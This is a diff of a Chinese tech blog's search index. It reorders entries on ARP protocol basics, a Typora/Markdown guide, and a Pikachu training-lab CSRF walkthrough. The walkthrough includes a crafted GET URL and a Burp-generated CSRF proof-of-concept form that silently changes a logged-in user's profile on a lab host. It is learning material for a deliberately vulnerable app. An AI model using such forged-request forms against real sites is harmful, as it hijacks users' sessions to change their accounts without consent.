@@ -1,100 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ARP协议原理与应用</title>
-    <url>/posts/9f9ac9a/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>OSI模型把网络工作分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接打交道。在 通过以太网发送IP数据包时，需要先封装第三层、第二层的包头，但由于发送时只知道目标IP地址，不知 道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议即ARP协议。</li>
-<li>ARP协议可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信 的顺利进行。</li>
-</ul>
-<h2 id="ARP协议概述"><a href="#ARP协议概述" class="headerlink" title="ARP协议概述"></a>ARP协议概述</h2><ul>
-<li>数据要在以太网中传输，需要完成以太网封装，这项工作由网络层负责；</li>
-<li>要完成以太网的数据封装，需要知道目的设备的MAC地址；</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105555.png" alt="1" loading="lazy"></p>
-<ul>
-<li>ARP <ul>
-<li>Address Resolution Protocol 地址解析协 议</li>
-<li>作用：将 IP地址解析为 MAC地址</li>
-<li>注意：ARP报文不能穿越路由器，不能被转 发到其他广播域</li>
-</ul>
-</li>
-<li>ARP缓存表<ul>
-<li>用于存储IP地址及其经过解析的MAC地址的 对应关系</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105558.png" alt="2" loading="lazy"></p>
-<h2 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h2><p>ARP工作流程</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105601.png" alt="3" loading="lazy"></p>
-<p>ARP工作原理</p>
-<ul>
-<li>先查看ARP表，如果ARP表中没有目的IP地址对应的MAC表项，则发送ARP请求包；</li>
-<li>源主机广播发送ARP request 数据包，请求目的主机的MAC地址；</li>
-<li>同网段内的所有主机都能收到ARP request请求包，但只有目的主机才会回复ARP reply数据包；</li>
-<li>源主机收到ARP reply后，将目的主句的IP-MAC对应关系添加进ARP表中，完成数据的以太网封装，进行 数据交互</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105604.png" alt="4" loading="lazy"></p>
-<p>ARP缓存表</p>
-<ul>
-<li>动态表项<ul>
-<li>通过ARP协议学习，能被更新，缺省老化时间120s</li>
-</ul>
-</li>
-<li>静态表项<ul>
-<li>手工配置，不能被更新，无老化时间的限制</li>
-</ul>
-</li>
-</ul>
-<p>ARP协议分类</p>
-<p>免费ARP（Gratuitous ARP ）</p>
-<ul>
-<li>发送ARP请求，请求本机IP对应的MAC <ul>
-<li>免费ARP的作用：确定其它设备的 IP地址是否与本机 IP地址冲突 </li>
-<li>更改了地址，通知其他设备更新 ARP表项</li>
-</ul>
-</li>
-</ul>
-<p>代理ARP（Proxy ARP ）</p>
-<ul>
-<li>由启动了代理ARP功能的网关&#x2F;下一跳设备代为应答ARP请求，该ARP请求的是其他IP对应的MAC地址。</li>
-<li>回应ARP请求的条件<ul>
-<li>本地有去往目的IP的路由表 </li>
-<li>收到该ARP请求的接口与路由表下一跳不是同一个接口</li>
-</ul>
-</li>
-</ul>
-<p>RARP与IARP</p>
-<ul>
-<li>RARP  Reverse Address Resolution Protocol 反向地址解析协议 <ul>
-<li>把MAC地址解析为IP地址 </li>
-<li>应用场景：常用于无盘工作站</li>
-</ul>
-</li>
-<li>IARP <ul>
-<li>Inverse Address Resolution Protocol 逆向地址解析协议 </li>
-<li>在帧中继网络中解析对端IP地址和本地DLCL的映射关系</li>
-<li>应用场景：应用于帧中继网络</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AC双热机备份</title>
     <url>/posts/50b45d5b/</url>
     <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615151950.png" alt="image-20220615151949929" loading="lazy"></p>
@@ -649,6 +555,100 @@ option 43 sub-option 3 ascii 10.1.201.3
       </categories>
       <tags>
         <tag>eNSP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ARP协议原理与应用</title>
+    <url>/posts/9f9ac9a/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>OSI模型把网络工作分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接打交道。在 通过以太网发送IP数据包时，需要先封装第三层、第二层的包头，但由于发送时只知道目标IP地址，不知 道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议即ARP协议。</li>
+<li>ARP协议可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信 的顺利进行。</li>
+</ul>
+<h2 id="ARP协议概述"><a href="#ARP协议概述" class="headerlink" title="ARP协议概述"></a>ARP协议概述</h2><ul>
+<li>数据要在以太网中传输，需要完成以太网封装，这项工作由网络层负责；</li>
+<li>要完成以太网的数据封装，需要知道目的设备的MAC地址；</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105555.png" alt="1" loading="lazy"></p>
+<ul>
+<li>ARP <ul>
+<li>Address Resolution Protocol 地址解析协 议</li>
+<li>作用：将 IP地址解析为 MAC地址</li>
+<li>注意：ARP报文不能穿越路由器，不能被转 发到其他广播域</li>
+</ul>
+</li>
+<li>ARP缓存表<ul>
+<li>用于存储IP地址及其经过解析的MAC地址的 对应关系</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105558.png" alt="2" loading="lazy"></p>
+<h2 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h2><p>ARP工作流程</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105601.png" alt="3" loading="lazy"></p>
+<p>ARP工作原理</p>
+<ul>
+<li>先查看ARP表，如果ARP表中没有目的IP地址对应的MAC表项，则发送ARP请求包；</li>
+<li>源主机广播发送ARP request 数据包，请求目的主机的MAC地址；</li>
+<li>同网段内的所有主机都能收到ARP request请求包，但只有目的主机才会回复ARP reply数据包；</li>
+<li>源主机收到ARP reply后，将目的主句的IP-MAC对应关系添加进ARP表中，完成数据的以太网封装，进行 数据交互</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105604.png" alt="4" loading="lazy"></p>
+<p>ARP缓存表</p>
+<ul>
+<li>动态表项<ul>
+<li>通过ARP协议学习，能被更新，缺省老化时间120s</li>
+</ul>
+</li>
+<li>静态表项<ul>
+<li>手工配置，不能被更新，无老化时间的限制</li>
+</ul>
+</li>
+</ul>
+<p>ARP协议分类</p>
+<p>免费ARP（Gratuitous ARP ）</p>
+<ul>
+<li>发送ARP请求，请求本机IP对应的MAC <ul>
+<li>免费ARP的作用：确定其它设备的 IP地址是否与本机 IP地址冲突 </li>
+<li>更改了地址，通知其他设备更新 ARP表项</li>
+</ul>
+</li>
+</ul>
+<p>代理ARP（Proxy ARP ）</p>
+<ul>
+<li>由启动了代理ARP功能的网关&#x2F;下一跳设备代为应答ARP请求，该ARP请求的是其他IP对应的MAC地址。</li>
+<li>回应ARP请求的条件<ul>
+<li>本地有去往目的IP的路由表 </li>
+<li>收到该ARP请求的接口与路由表下一跳不是同一个接口</li>
+</ul>
+</li>
+</ul>
+<p>RARP与IARP</p>
+<ul>
+<li>RARP  Reverse Address Resolution Protocol 反向地址解析协议 <ul>
+<li>把MAC地址解析为IP地址 </li>
+<li>应用场景：常用于无盘工作站</li>
+</ul>
+</li>
+<li>IARP <ul>
+<li>Inverse Address Resolution Protocol 逆向地址解析协议 </li>
+<li>在帧中继网络中解析对端IP地址和本地DLCL的映射关系</li>
+<li>应用场景：应用于帧中继网络</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>锐捷</category>
+      </categories>
+      <tags>
+        <tag>锐捷</tag>
       </tags>
   </entry>
   <entry>
@@ -3680,64 +3680,6 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </tags>
   </entry>
   <entry>
-    <title>Pikachu--CSRF</title>
-    <url>/posts/546fe1af/</url>
-    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
-<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
-<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
-<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
-<p>然后浏览器上代理，用burpsuite抓包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
-<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
-<p>也可以直接构造一个url:</p>
-<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
-<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
-<p>直接在包中修改信息</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
-<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
-<p>表单代码:</p>
-<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
-  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
-  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
-<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
-<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
-<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
-<p>解决办法:</p>
-<p>切换PHP版本\刷新网页</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pikachu--SQL注入(一)</title>
     <url>/posts/22ddbd5a/</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
@@ -3989,6 +3931,64 @@ Received 23358 broadcasts, 0 runts, 0 giants
 <p>参考链接： </p>
 <p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
 <p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu--CSRF</title>
+    <url>/posts/546fe1af/</url>
+    <content><![CDATA[<h1 id="Pikachu——CSRF"><a href="#Pikachu——CSRF" class="headerlink" title="Pikachu——CSRF"></a>Pikachu——CSRF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站]对用户网页浏览器的信任。</p>
+<p>来自:<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/13777878?fromtitle=CSRF&fromid=2735433&fr=aladdin">百度百科 </a></p>
+<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
+<h2 id="一、CSRF-get"><a href="#一、CSRF-get" class="headerlink" title="一、CSRF(get)"></a>一、CSRF(get)</h2><p>登陆后点击修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004817.png" alt="1" loading="lazy"></p>
+<p>然后浏览器上代理，用burpsuite抓包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004869.png" alt="2" loading="lazy"></p>
+<p>上面是get请求的内容，我们把phonenum的值修改为123456，然后forword，发现账号kobe的信息发生了变化，结果如下图：</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004468.png" alt="3" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004134.png" alt="4" loading="lazy"><em>修改成功</em></p>
+<p>也可以直接构造一个url:</p>
+<p><code> http://192.168.224.135/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=hack&amp;phonenum=hack&amp;add=123456&amp;email=kobe%40pikachu.com&amp;submit=submit</code> </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004797.png" alt="5" loading="lazy"><em>修改成功</em></p>
+<h2 id="二、CSRF（POST）"><a href="#二、CSRF（POST）" class="headerlink" title="二、CSRF（POST）"></a>二、CSRF（POST）</h2><p>也是先登录，这是必要的，然后抓取提交修改的流量，是POST方式。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132004132.png" alt="6" loading="lazy"></p>
+<p>直接在包中修改信息</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005813.png" alt="7" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005429.png" alt="8" loading="lazy"></p>
+<p>也可以自己建一个表单，让被攻击者点恶意站点表单的URL。通过表单的URL去向存在CSRF漏洞的页面去提交POST请求。</p>
+<p>表单代码:</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/pikachu/vul/csrf/csrfpost/csrf_post_edit.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>61<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>132<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>852741<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kobe<span class="token entity" title="&#64;">&amp;#64;</span>pikachu<span class="token entity" title="&#46;">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005169.png" alt="9" loading="lazy"></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005882.png" alt="10" loading="lazy"></p>
+<h2 id="三、CSRF（token）"><a href="#三、CSRF（token）" class="headerlink" title="三、CSRF（token）"></a>三、CSRF（token）</h2><p>同样的过程，get方式修改信息，但是还带了一个token参数。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005304.png" alt="11" loading="lazy"></p>
+<p>由于这个token是随机不可预测的并且是隐藏看不见的，并且每次刷新，后台发送过来的token都不一样，起到了防止伪造的作用.对于token，暂时还没有什么办法通过</p>
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>提示:使用未定义的常量 MYSQL_ASSOC. 如图所示: </p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005922.png" alt="12" loading="lazy"></p>
+<p>解决办法:</p>
+<p>切换PHP版本\刷新网页</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204132005830.png" alt="13" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -4703,6 +4703,319 @@ Ruijie#terminal monitor </code></pre>
       </tags>
   </entry>
   <entry>
+    <title>Typora基本用法</title>
+    <url>/posts/1bd41834/</url>
+    <content><![CDATA[<p>[toc]</p>
+<h2 id="Typore简介"><a href="#Typore简介" class="headerlink" title="Typore简介"></a>Typore简介</h2><p>Typora是一款轻便简洁的Markdown编辑器，支持即时渲染技术，这也是与其他Markdown编辑器最显著的区别。即时渲染使得你写Markdown就想是写Word文档一样流畅自如，不像其他编辑器的有编辑栏和显示栏。</p>
+<h2 id="Markdown介绍"><a href="#Markdown介绍" class="headerlink" title="Markdown介绍"></a>Markdown介绍</h2><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。<br>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。<br>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。<br>Markdown 编写的文档后缀为 .md, .markdown。</p>
+<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>加粗： Ctrl + B			字体倾斜：Ctrl+I			      下划线 ：Ctrl+U</p>
+<p>插入链接：Ctrl + K 		   	创建表格：Ctrl+T</p>
+<p>行内代码：Ctrl + Shift + K	  插入图片：Ctrl + Shift + I	   	     插入图片：Ctrl+Shift+M</p>
+<p>选中某句话：Ctrl+L 		  选中某个单词： Ctrl+D	        搜索：Ctrl+F </p>
+<p>搜索并替换：Ctrl+H		选中相同格式的文字：Ctrl+E        删除线：Alt+Shift+5 </p>
